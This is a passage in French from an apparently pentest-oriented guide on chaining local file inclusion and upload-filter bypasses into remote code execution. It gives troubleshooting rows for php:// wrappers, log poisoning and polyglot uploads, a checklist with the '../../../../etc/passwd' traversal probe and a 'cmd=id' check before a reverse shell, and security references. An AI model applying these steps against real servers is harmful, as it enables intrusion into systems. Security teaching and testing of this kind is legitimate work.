| Wrapper `php://filter` retourne une erreur PHP | `allow_url_fopen = Off` (rare) ou accès bloqué au fichier ciblé | Changer le fichier cible (`resource=`) | Tester avec `resource=.` (répertoire courant) pour confirmer que le wrapper est disponible | Que le wrapper est disponible mais la cible spécifique est inaccessible (ou l'inverse) |
| `php://input` sans effet visible | `allow_url_include = Off` (probable) | Confirmer avec le log poisoning ou la session poisoning | Passer à une technique ne nécessitant pas ce paramètre | Que ce vecteur précis est fermé — pas que la LFI est inexploitable |
| Log poisoning sans output de commande | Logs non lisibles par le processus web, ou payload écrasé par d'autres requêtes | Vérifier les droits avec la LFI (`/proc/self/status`) | Retenter avec un User-Agent unique + inclusion immédiate sans délai | Que ce log particulier est inaccessible ou que le timing est problématique |
| Upload refusé malgré bypass MIME | Magic Bytes également vérifiés, ou liste blanche d'extensions côté serveur | Tester un fichier polyglotte (section 3.4) ou une extension alternative | Si re-compression GD suspectée : chercher un autre vecteur d'injection | Que la validation MIME seule est insuffisante comme hypothèse ici |
| Fichier uploadé mais non exécuté via LFI | `php_flag engine off` dans le répertoire d'uploads, ou extension renommée en `.dat` | Vérifier la réponse à l'inclusion directe (erreur ou contenu brut ?) | Si extension renommée non `.php` : `include()` exécute quand même le PHP — vérifier le contenu retourné | Que l'upload est accepté mais que l'exécution est désactivée dans ce répertoire précis |
| Chemin du fichier uploadé inconnu | Renommage aléatoire sans fuite de chemin | Chercher dans d'autres réponses (galerie, profil, API) ou via une LFI sur les logs d'upload | Si aucun chemin n'est trouvable : le chaining est impossible sans une information complémentaire | Que le chaining est bloqué côté information, pas côté technique |

---

## 11. Checklist d'utilisation

- [ ] Un paramètre influençant une lecture ou inclusion de fichier est identifié.
- [ ] La sonde minimale (`../../../../etc/passwd`) a été testée pour confirmer le Path Traversal.
- [ ] Le wrapper `php://filter` a été testé pour qualifier une LFI PHP exploitable.
- [ ] Si `allow_url_include = On` est confirmé : `php://input` ou `data://` testés.
- [ ] Sinon : log poisoning ou session poisoning tentés en fonction des droits.
- [ ] Pour les uploads : la nature du filtre est identifiée avant de choisir le bypass (JS/liste noire/MIME/Magic Bytes).
- [ ] Une seule variable est modifiée à la fois lors du bypass d'upload (extension OU contenu OU `Content-Type`).
- [ ] Le chemin du fichier uploadé est documenté avant de tenter le chaining.
- [ ] La RCE est confirmée avec `cmd=id` avant d'escalader vers un reverse shell.
- [ ] Les résultats importants sont reproduits au moins une fois avant d'être documentés.

---

## 12. Sources et liens de référence

- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger Web Security Academy — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [HackTricks — LFI to RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Wikipedia — List of file signatures (Magic Bytes)](https://en.wikipedia.org/wiki/List_of_file_signatures)
